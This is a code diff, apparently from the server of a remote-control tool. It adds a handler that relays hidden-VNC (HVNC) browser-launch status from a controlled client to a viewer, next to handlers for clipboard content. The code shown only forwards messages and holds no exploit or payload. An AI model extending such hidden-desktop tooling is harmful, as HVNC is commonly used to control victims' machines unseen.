@@ -795,6 +795,18 @@ export function handleHVNCDXGIStatus(clientId: string, payload: any) {
   }
 }
 
+export function handleHVNCBrowserLaunchStatus(clientId: string, payload: any) {
+  for (const session of sessionManager.getHvncSessionsForClient(clientId)) {
+    safeSendViewer(session.viewer, {
+      type: "hvnc_browser_launch_status",
+      browser: String(payload.browser || ""),
+      step: String(payload.step || ""),
+      success: !!payload.success,
+      detail: String(payload.detail || ""),
+    });
+  }
+}
+
 export function handleClipboardContent(clientId: string, payload: any) {
   const text = String(payload.text || "");
   const source = String(payload.source || "");
